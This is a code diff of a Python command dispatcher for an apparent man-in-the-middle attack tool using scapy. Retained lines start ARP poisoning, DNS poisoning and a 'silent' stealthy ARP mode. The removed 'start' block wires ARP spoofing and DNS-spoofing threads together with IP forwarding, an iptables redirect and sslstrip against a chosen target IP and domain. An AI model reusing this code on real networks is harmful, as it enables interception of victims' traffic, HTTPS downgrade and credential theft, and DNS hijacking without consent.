@@ -4,8 +4,7 @@ import os
 import shlex
 from scan import scan_hosts, scan_ifaces
 from arp_spoofing import arp_spoof, start_arp_poison
-from dns_spoofing import dns_spoof
-from dns import start_dns_poison
+from dns_spoofing import start_dns_poison
 import threading
 import scapy.all as sc
 import time
@@ -64,53 +63,7 @@ def handle_command(cmd):
         start_arp_poison(cmd)
     elif cmd.startswith("dnspoison"):
 		#Basic arp poison
-		start_dns_poison(cmd)
-    elif cmd.startswith("start"):
-        # Example usage: start -ip 192.168.1.10 -mac aa:bb:cc:dd:ee:ff -iptospoof 192.168.1.1
-        args = shlex.split(cmd)
-        ip = mac = spoofed_ip = None
-        for i, arg in enumerate(args):
-            if arg == "-ip" and i + 1 < len(args):
-                ip = args[i + 1]
-            elif arg == "-mac" and i + 1 < len(args):
-                mac = args[i + 1]
-            elif arg == "-iptospoof" and i + 1 < len(args):
-                spoofed_ip = args[i + 1]
-        if not ip or not mac or not spoofed_ip:
-            print("[!] Usage: start -ip <target_ip> -mac <target_mac> -iptospoof <spoofed_ip>")
-            return
-        print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
-
-        sslstrip.start_ip_forwarding()
-        sslstrip.start_iptables_redirect()
-        sslstrip.start_sslstrip()
-
-        target_domain = raw_input("Enter the domain to spoof (e.g. example.com.): ").strip()
-        if not target_domain.endswith('.'):
-            target_domain += '.'
-        target_domain = target_domain.encode()
-        print("[*] Spoofing %s (MAC: %s) as %s and DNS spoofing %s ..." % (ip, mac, spoofed_ip, target_domain.decode()))
-
-        def arp_spoof_loop(ip, mac, spoofed_ip):
-            print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
-            while True:
-                arp_spoof(ip, mac, spoofed_ip)
-                time.sleep(2)
-
-        # Start a new thread for DNS spoofing in order 
-        def dns_spoof_thread():
-            sc.sniff(
-                filter=("udp port 53 and src %s" % ip),
-                prn=lambda packet: dns_spoof(packet, ip, spoofed_ip, target_domain)
-            )
-        
-        arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, mac, spoofed_ip))
-        arp_thread.daemon = True
-        arp_thread.start()
-
-        dns_thread = threading.Thread(target=dns_spoof_thread)
-        dns_thread.daemon = True
-        dns_thread.start()
+        start_dns_poison(cmd)
     elif cmd == "silent":
         print("[*] Starting in silent mode (stealthy ARP poisoning)...")
         # Start spoofing in silent mode
